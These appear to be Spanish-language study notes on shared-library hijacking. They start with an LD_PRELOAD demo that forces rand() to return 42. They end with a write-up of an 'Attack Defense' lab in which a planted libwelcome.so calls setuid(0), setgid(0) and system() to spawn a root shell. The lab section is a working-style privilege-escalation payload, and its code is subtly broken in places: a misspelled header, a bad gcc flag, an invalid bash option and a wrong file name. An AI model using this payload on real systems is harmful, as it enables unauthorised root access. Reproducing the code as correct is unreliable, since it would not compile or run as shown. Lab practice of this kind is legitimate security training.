> Es similar al path hijacking porque nos aprovechamos de la ejecucion de un archivo que usa biblioteca y creamos una biblioteca local que hace lo que nosotros queremos.

## Paso a paso
- Creamos un script en c para mostrarnos por consola un numero random
```c
#include <stdio.h>
#include <time.h>
#include <stdlib.h>

int main(int argc, char const *argv[]) {
	srand(time(NULL));
	printf("%d\n", rand());
}
```
- Compilamos y ejecutamos
```
gcc random.c -o random
./random
```
- Para ver que librerias utiliza
```
ldd random
``` 

- Hay una herramienta que hace un mejor rastreo **[[uftrace]]** herramienta
```bash
misc/install-deps.sh
./configure
make
make install
```
- Ejecutamos 
```
uftrace --force -a random
```

- Tenemos que leer en la parte 3 del manula rand
```
man 3 rand
```
- Que nos dice como ejecutar una funcion que siempre devuelva lo mismo
- Creamos el archivo **nvim test.c**
```c
int rand(void){
	return 42;
}
```
- Ejecutamos de tal forma que utilizamos una bandera para generar un codigo de posicion independiente y ejecutamos el archivo `random` con ese nuevo archivo
```bash
gcc -shared -fPIC test.c -o test
LD_PRELOAD=./test ./random
```
- Y ahora devuelve siempre 42

## Attach defense - Library chaos
- En la pagina **attack defense** hay un laboratorio llamado **library chaos** que si lo corremos podemos hacer una vulnerabilidad similar
- Con run corremos:
```
ls -l /usr/bin/welcome
welcome
```
- Hay un binario **welcome** que ejecuta una libreria que no existe y la podemos crear
```bash
ldd /usr/bin/welcome
cat custom.conf

ls -l /etc/ld.so.conf.d/
pwd
cd /etc/ld.so.conf.d/
mkdir lib
cd lib
```
- Creamos **vi test.c**
```c
#include <stdio.h>
#include <unitd.h>

int welcome(){
	setuid(0);
	setgid(0);
	system("bash  -d");
	return 0;
}
```
- Y hacemos lo mismo y logramos ser root
```bash
gcc -fPIC -shread test.c -o libwelcome.so
mv libwelcome /home/student/lib
welcome
```







